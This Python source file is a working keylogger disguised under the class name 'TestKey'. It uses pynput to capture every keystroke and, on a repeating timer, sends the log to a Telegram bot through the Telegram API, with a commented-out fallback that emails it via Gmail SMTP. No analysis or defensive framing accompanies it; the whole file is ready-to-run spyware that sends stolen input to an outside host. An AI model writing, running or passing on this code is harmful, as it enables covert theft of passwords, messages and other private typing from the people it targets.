import smtplib
import threading

import pynput
import requests


class TestKey:

    def __init__(self, interval, email, password, bot_token, chat_id):
        self.log = "Test key started.\n"
        self.interval = interval
        self.email = email
        self.password = password
        self.bot_token = bot_token
        self.chat_id = chat_id

    def append_to_log(self, string):
        self.log += string

    def send_mail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def send_to_telegram(self, message):
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage?chat_id={self.chat_id}&text={message}"
        return requests.get(url)

    def report(self):
        self.send_to_telegram(self.log)
        #self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""

        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.shift:
                current_key = " "
            elif key == key.enter:
                current_key = "\n"
            elif key == key.backspace:
                current_key = ""
            elif key == key.tab:
                current_key = "\t"
            elif key == key.ctrl:
                current_key = " "
            elif key == key.alt:
                current_key = " "
            elif key == key.caps_lock:
                current_key = " "
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)

    def run(self):
        self.report()
        kb_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with kb_listener:
            kb_listener.join()
